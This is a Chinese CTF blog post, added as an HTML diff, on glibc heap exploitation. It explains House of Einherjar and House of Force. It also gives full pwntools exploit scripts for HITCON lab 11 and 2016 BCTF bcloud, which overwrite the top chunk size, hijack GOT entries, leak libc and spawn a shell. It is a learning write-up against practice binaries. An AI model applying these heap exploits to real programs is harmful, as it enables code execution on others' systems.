@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Wgiegie-house of系列 | 纲的blog</title>
+
+  <!-- keywords -->
+  
+    <meta name="keywords" content="Wgiegie">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="之前在堆的基础解法那里简单说了一下有关于堆的利用，从这里开始新起一章，这章主要讲一讲有关于house of的各各系列的手法与对应的libc版本。 shellphish&#x2F;how2heap: A repository for learning various heap exploitation techniques. (github.com) 关于这里的手法的具体例子可以再这里查看，下面我就">
+<meta property="og:type" content="article">
+<meta property="og:title" content="house of系列">
+<meta property="og:url" content="https://2023478.github.io/2024/07/25/house-of%E7%B3%BB%E5%88%97/index.html">
+<meta property="og:site_name" content="纲的blog">
+<meta property="og:description" content="之前在堆的基础解法那里简单说了一下有关于堆的利用，从这里开始新起一章，这章主要讲一讲有关于house of的各各系列的手法与对应的libc版本。 shellphish&#x2F;how2heap: A repository for learning various heap exploitation techniques. (github.com) 关于这里的手法的具体例子可以再这里查看，下面我就">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://2023478.github.io/2024/07/25/house-of%E7%B3%BB%E5%88%97/8f1aa2d976405baa7dce4788d6596429.png">
+<meta property="og:image" content="https://2023478.github.io/2024/07/25/house-of%E7%B3%BB%E5%88%97/2db6cd43c182b120aebe76db0e73378e.png">
+<meta property="og:image" content="https://2023478.github.io/2024/07/25/house-of%E7%B3%BB%E5%88%97/00b80539a36ea470a02c5e4c335a3a69.png">
+<meta property="og:image" content="https://2023478.github.io/2024/07/25/house-of%E7%B3%BB%E5%88%97/image-20240726132607140.png">
+<meta property="og:image" content="https://2023478.github.io/2024/07/25/house-of%E7%B3%BB%E5%88%97/image-20240726135153267.png">
+<meta property="og:image" content="https://2023478.github.io/2024/07/25/house-of%E7%B3%BB%E5%88%97/image-20240726140906823.png">
+<meta property="article:published_time" content="2024-07-25T07:34:10.000Z">
+<meta property="article:modified_time" content="2024-07-26T07:18:28.312Z">
+<meta property="article:author" content="wgiegie">
+<meta property="article:tag" content="堆">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://2023478.github.io/2024/07/25/house-of%E7%B3%BB%E5%88%97/8f1aa2d976405baa7dce4788d6596429.png">
+  
+    <link rel="alternative" href="/atom.xml" title="纲的blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 10px;">C语言</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwn%E5%A7%BF%E5%8A%BF/" style="font-size: 10px;">pwn姿势</a> <a href="/tags/pwn%E5%B7%A5%E5%85%B7/" style="font-size: 15px;">pwn工具</a> <a href="/tags/pwn%E9%A2%98%E8%A7%A3/" style="font-size: 15px;">pwn题解</a> <a href="/tags/%E5%91%A8%E6%8A%A5/" style="font-size: 10px;">周报</a> <a href="/tags/%E5%A0%86/" style="font-size: 20px;">堆</a> <a href="/tags/%E6%90%AD%E5%8D%9A%E5%AE%A2/" style="font-size: 10px;">搭博客</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-house-of系列" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/07/25/house-of%E7%B3%BB%E5%88%97/" class="article-date">
+  	<time datetime="2024-07-25T07:34:10.000Z" itemprop="datePublished">2024-07-25</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      house of系列
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%A0%86/" rel="tag">堆</a></li></ul>
+	</div>
+
+        
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/CTF/">CTF</a>
+	</div>
+
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>之前在堆的基础解法那里简单说了一下有关于堆的利用，从这里开始新起一章，这章主要讲一讲有关于house of的各各系列的手法与对应的libc版本。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap?tab=readme-ov-file">shellphish&#x2F;how2heap: A repository for learning various heap exploitation techniques. (github.com)</a></p>
+<p>关于这里的手法的具体例子可以再这里查看，下面我就开启有关我对这里面的各中手法的理解与在做题时遇到的问题做一个具体的说明。</p>
+<h1 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h1><p>这种利用方法与之前的方法有所不同的在于，其用到了一个之前没有过多使用，并且尽可能规避的有个chunk，</p>
+<p>这个chunk就是我们之前有所提到的，在所有我们自行申请堆的chunk只外的有程序在malloc我们申请的一个chunk时会与这个chunk一起从程序中为我们产生的top chunk。不过在正常情况下产生的这个top chunk，并不能直接供我们使用，只是作为一个chunk的后备资源，在后面如果我们有再次malloc的时候程序可以直接从top chunk中取出对应的chunk大小，从而使我们能快速申请到对应的chunk，不必在从程序中拿取chunk。</p>
+<p>正常情况下程序中的top chunk都有在malloc函数执行后就固定产生的大小，这个大小是固定的，如果程序申请的新的chunk的大小小于这个top chunk的大小，程序便会直接先从top chunk中分配出来使用，如果大于这个top chunk的大小则会从新向程序申请。</p>
+<p>这里便是我们这种手法的关键所在，关于我们能从top chunk中申请到多大的chunk这个是由top chunk的size决定的， 那这样如果我们能在top chunk的前一个chunk中存在堆溢出，那我们就可以修改top chunk中的size的大小，然后再在程序的其他地方比如<strong>栈或bss数据段</strong>等地址伪造一个fake_chunk ，然后让这个伪造的chunk和之前的存在堆溢出的chunk，一同被释放，并吧我们伪造的chunk到存在堆溢出的chunk的这一段距离都当做之前fake_chunk的大小一同free进入到top chunk中（top chunk相近的chunk free掉会直接与top chunk合并），这样就能导致top chunk的大小被远远放大，导致其起始地址直接从我们伪造的chunk开始。那这样之后我们在向程序申请chunk，程序便会从我们之前伪造的chunk的地址开始申请，使得我们可以控制栈或bss的地址进行我们想要的操作。</p>
+<p>大致的过程就是上面的内容，当重点在于如何操作下面便是这种方法的具体操作。</p>
+<p><img src="/2024/07/25/house-of%E7%B3%BB%E5%88%97/8f1aa2d976405baa7dce4788d6596429.png" alt="在这里插入图片描述"></p>
+<p>简单来说也就是这幅图的内容，</p>
+<ol>
+<li><p>在栈或bss中（更具题目需要）构造fake_chunk</p>
+<p><img src="/2024/07/25/house-of%E7%B3%BB%E5%88%97/2db6cd43c182b120aebe76db0e73378e.png" alt="在这里插入图片描述"></p>
+<p>大致要像这个一样，prev_size随便，size后面要计算的可以先放放，之后的4个位置都要放的是我们构造的fake_chunk的头地址，</p>
+</li>
+<li><p>计算fake_chunk的size和靠近top chunk的chunk（下面叫chunk_b）的prev_size 大小（这两个大小相同），并修改chunk_b的size的最后一位为0</p>
+<p>这里为了让从fake_chunk到我们的top chunk的内容都能被程序放入到top chunk中，就要把从fake_chunk到chunk_b的距离计算出来然后放入fake_chunk的size和chunk_b的prev_size位置。</p>
+<p><strong>距离&#x3D;chunk_b的头地址-fake_chunk头地址</strong></p>
+<p><img src="/2024/07/25/house-of%E7%B3%BB%E5%88%97/00b80539a36ea470a02c5e4c335a3a69.png" alt="在这里插入图片描述"></p>
+<p>这里要用小的地址-大的地址，得到的才是正确的地址，最后的结果要想上面的一样。</p>
+</li>
+<li><p>free掉chunk_b</p>
+<p>将chunk_b释放之后，由于我们修改了chunk_b的size 和prev_size的大小，使得程序将它free后会仍为从这个chunk到我们伪造的chunk都是free_chunk，从而使程序开启chunk的合并机制。并导致从我们的fake_chunk开始的头地址被当做top chunk的头地址，然后便可以在下一次malloc时，就从我们fake_chunk的头地址开始分配，从而达到我们控制栈或bss段的地址。</p>
+</li>
+</ol>
+<p>以上便是这个手法的利用，相对来说是一个比较攻击力大的手法，在ctfwiki上有一题，一会可以供我们分析一下。</p>
+<h1 id="House-Of-Force"><a href="#House-Of-Force" class="headerlink" title="House Of Force"></a><strong>House Of Force</strong></h1><p>这种方法对于堆的利用相对来说过程是比较简单的一种，不过由于程序的条件实行条件比较苛刻，故利用的地方不算特别多，并且这种手法的使用相对来说也有一定复杂的地方，故这种手法具体将通过题目来进行详解。</p>
+<p>这种手法简单来说就是，通过堆溢出，修改top chunk的size的值为0xffffffffffffffff&#x2F;0xffffffff(64位或32位的-1)</p>
+<p>然后将可以向程序申请一个很大很大的chunk，由于top chunk被我们修改为这个在程序中被认为是无限大的数字，所以我们的申请一定会被满足，而对于超出程序中原本top chunk的大小的内容，程序便会从其他地方拿却使用，故这里我们便可以直接申请一个到我们目标地址的chunk，然后就可以对这个地址进行修改和输入数据，由于我们的申请的内容一定是从程序中去申请而不向内核申请（top chunk的大小被我们修改为程序的最大值），故我们甚至可以直接申请到栈或bss等其他地址。从而满足我们后门的操作。</p>
+<p>这个手法的利用相对来说比较简单，当条件比较苛刻</p>
+<ul>
+<li>首先，需要存在漏洞使得用户能够控制 top chunk 的 size 域。</li>
+<li>其次，<strong>需要用户能自由控制 malloc 的分配大小</strong></li>
+<li>第三，分配的次数不能受限制</li>
+</ul>
+<p>只有能满足这3点才算能使用这种手法的题目。</p>
+<h3 id="HITCON-training-lab-11"><a href="#HITCON-training-lab-11" class="headerlink" title="HITCON training lab 11"></a><strong>HITCON training lab 11</strong></h3><p>这道题是ctfwiki上的题目相对来说是一到，比较简单的题目，</p>
+<p>他的漏洞在于第3个选项时，用于修改堆的内容的函数。这里我们看下面的从18到21行，可以看出来，这里对于我们需要新输入到程序中的内容的大小，是由我们自行输入的，并且对大小并没有一个是非的检查，这里存在一个堆溢出的漏洞，我们可以先输入一个巨大的数字从而形成堆溢出，</p>
+<p><img src="/2024/07/25/house-of%E7%B3%BB%E5%88%97/image-20240726132607140.png" alt="image-20240726132607140"></p>
+<p>再看其他的函数就是正常的一个show函数，一个malloc函数，一个change函数，一个free函数，整个程序的漏洞就在于我们刚刚说的堆溢出，并且这里有关于堆的大小申请是由我们自行输入决定的。并且在程序中还存在一个后门函数，于是我们的重点就在于如果使程序能够跳转执行我们的后门函数。</p>
+<p><img src="/2024/07/25/house-of%E7%B3%BB%E5%88%97/image-20240726135153267.png" alt="image-20240726135153267"></p>
+<p>这里回到主函数中就会有所发现，这个当我们选择5时，程序便会执行v4[1],而这个v4就是程序在一开始申请的第一个chunk的指针，故这里我们可以像是否能修改第一个chunk的内容为我们后门函数的地址然后执行5选项，那目的就打成了。</p>
+<p>现在我们的目标就是如果拿到第一个chunk_v4的控制权。结合之前的堆溢出漏洞，其实这里可以使用unlink的方法，不过既然我们已经学了House Of Force的手法，那这里就使用一下这种方法。</p>
+<p>这里的思路简单讲一下就是</p>
+<ol>
+<li><p>先申请一个chunk（这里大小不限选0x30）</p>
+</li>
+<li><p>通过堆溢出修改top chunk的size为0xffffffffffffffff</p>
+</li>
+<li><p>计算从top chunk的头地址到到我们需要的chunk的头的地址的距离大小</p>
+<p><img src="/2024/07/25/house-of%E7%B3%BB%E5%88%97/image-20240726140906823.png" alt="image-20240726140906823"></p>
+<p>这里为0x20+0x40</p>
+</li>
+<li><p><strong>使用 house of force 技巧，我们需要绕过 request2size(req) 宏，这里由于 -0x60 是16字节对齐的，所以只要减去 SIZE_SZ 和 MALLOC_ALIGN_MASK 大小即可得出需要 malloc 的大小，然后我们再次分配就能分配到 chunk_v4处。</strong></p>
+<p>故这里的真实要申请地址为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">offset_to_heap_base = -(<span class="number">0x40</span> + <span class="number">0x20</span>)<span class="comment">//到chunk的距离</span></span><br><span class="line">malloc_size = offset_to_heap_base <span class="number">-0x17</span></span><br></pre></td></tr></table></figure>
+
+<p>关于这个0x17的值，准确来说可以是0x8~0x17中的任意一个数字就可以</p>
+</li>
+<li><p>在决定这个数字后向程序申请这个大小的chunk（就是要负数），便可以将chunk_v4包裹其中</p>
+</li>
+<li><p>在申请一个chunk输入后门函数的地址，然后执行5，变调用后门函数</p>
+</li>
+</ol>
+<p>exp</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./bbb&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_2</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;item name:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&#x27;name of item:&#x27;</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_1</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_3</span>(<span class="params">item,size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;index of item:&#x27;</span>,<span class="built_in">str</span>(item))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;of item name:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&#x27;name of the item:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free_4</span>(<span class="params">item</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;index of item:&#x27;</span>,<span class="built_in">str</span>(item))</span><br><span class="line"></span><br><span class="line">magic =<span class="number">0x400D49</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add_2(<span class="number">0x30</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x30</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *0x0400E7D&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">change_3(<span class="number">0</span>,<span class="number">0x40</span>,payload)</span><br><span class="line"></span><br><span class="line">offset_to_heap_base = -(<span class="number">0x40</span> + <span class="number">0x20</span>)</span><br><span class="line"><span class="comment">#malloc_size = offset_to_heap_base - 0x8 - 0xf(0x8~0x17)</span></span><br><span class="line">malloc_size = offset_to_heap_base -<span class="number">0x17</span></span><br><span class="line"></span><br><span class="line">add_2(malloc_size,<span class="string">b&#x27;dada&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add_2(<span class="number">0x10</span>,p64(magic)+p64(magic))</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#2.27</span></span><br></pre></td></tr></table></figure>
+
+<p>关于这道题的重点在于修改top chunk的堆的申请，一定要注意是距离的负数-0x8，申请这个之后的在申请的就是我们要的目标地址。</p>
+<h2 id="2016-BCTF-bcloud"><a href="#2016-BCTF-bcloud" class="headerlink" title="2016 BCTF bcloud"></a><strong>2016 BCTF bcloud</strong></h2><p>这道题相对来说就是上一道题的翻版，不过这道题的难点在于对程序中的漏洞的修找，这里我就是在寻找漏洞的时候出了一定的问题，导致一开始做的时候并没有做出来，后面看了一下别人的分析+自己在仔细调试才把这道题的问题完整明白。看来对C语言的理解和汇编的理解还是有点差了，之后要找时间再重新学一下。</p>
+<p>利用步骤如下:</p>
+<ul>
+<li>1.通过名字leak堆地址</li>
+<li>2.通过host and org 改大top_chunk-&gt;size</li>
+<li>3.移动top_chunk<ul>
+<li>让再申请的内存在覆盖到bss段中 list_len 和noet位置的内存</li>
+<li>让noet指向函数的got表</li>
+</ul>
+</li>
+<li>4.把free改成printf</li>
+<li>5.利用 假free 函数把atoi地址printf出来</li>
+<li>6.利用 atoi 得到system地址</li>
+<li>7.把atoi改成system</li>
+</ul>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./bcloud&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./bcloud&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/wzg/tools/glibc_all_in_one/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so&quot;</span>)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">#通过名字leak堆地址</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3c</span>+<span class="string">b&#x27;zzzz&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;Input your name:&#x27;</span>,payload)   </span><br><span class="line">io.recvuntil(<span class="string">&#x27;zzzz&#x27;</span>)   <span class="comment">#足够0x40不要加\n</span></span><br><span class="line">heap_addr=u32(io.recv(<span class="number">4</span>))-<span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;heap_addr: &#x27;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改top chunk的size为0xffffffff</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Org:\n&#x27;</span>)</span><br><span class="line">io.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">io.recvline(<span class="string">&#x27;Host:&#x27;</span>)</span><br><span class="line">io.sendline(p32(<span class="number">0xffffffff</span>))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)    </span><br><span class="line">    io.sendline(size) </span><br><span class="line">    io.sendline(content)</span><br><span class="line">  </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 移动top_chunk</span></span><br><span class="line">list_len= <span class="number">0x804B0A0</span></span><br><span class="line">note=<span class="number">0x804B120</span></span><br><span class="line">atoi=elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">free=elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"> </span><br><span class="line">size=heap_addr+<span class="number">3</span>*<span class="number">0x48</span>-list_len+<span class="number">0x17</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;-&#x27;</span>+<span class="built_in">str</span>(size),<span class="string">&#x27;junk&#x27;</span>) <span class="comment">#当前操作是把top_chunk上移     </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#下一个chunk-&gt;fd将是list_len地址 </span></span><br><span class="line">size=note-list_len+<span class="number">4</span>*<span class="number">10</span> <span class="comment">#这个size可以改list_len及note</span></span><br><span class="line">payload=p32(<span class="number">4</span>)*<span class="number">3</span>+p32(<span class="number">0</span>)*<span class="number">29</span><span class="comment">#这里最后要用到最后一个地址,现在预留出来3个p32的地址</span></span><br><span class="line">payload += p32(atoi)</span><br><span class="line">payload += p32(free)</span><br><span class="line">payload += p32(atoi)</span><br><span class="line">payload += p32(<span class="number">0</span>) * <span class="number">8</span></span><br><span class="line">add(<span class="built_in">str</span>(size),payload)        <span class="comment">#id=1</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#free函数的地址改成printf函数</span></span><br><span class="line">printf=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)    </span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>) </span><br><span class="line">io.send(p32(printf))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Edit success.\n&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#利用 假free 函数把atoi地址printf出来</span></span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)    </span><br><span class="line">io.recvuntil(<span class="string">&#x27;Input the id:\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">atoi_addr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line">success(<span class="string">&#x27;2.atoi addr = &#x27;</span>+<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Delete success.\n&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#利用 atoi_addr 得到system地址</span></span><br><span class="line">base_libc= atoi_addr-libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base_libc: &#x27;</span>,<span class="built_in">hex</span>(base_libc))</span><br><span class="line">system =libc.symbols[<span class="string">&#x27;system&#x27;</span>]+base_libc</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system: &#x27;</span>,<span class="built_in">hex</span>(system))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#把atoi改成system</span></span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)    </span><br><span class="line">io.sendline(<span class="string">&#x27;2&#x27;</span>) </span><br><span class="line">io.send(p32(system))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2024/06/23/%E5%91%A8%E6%8A%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">周报</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="house-of系列" data-title="house of系列" data-url="https://2023478.github.io/2024/07/25/house-of%E7%B3%BB%E5%88%97/"  data-images="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" data-content="house of系列">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2024 wgiegie
+      </div>
+        <div class="footer-right">
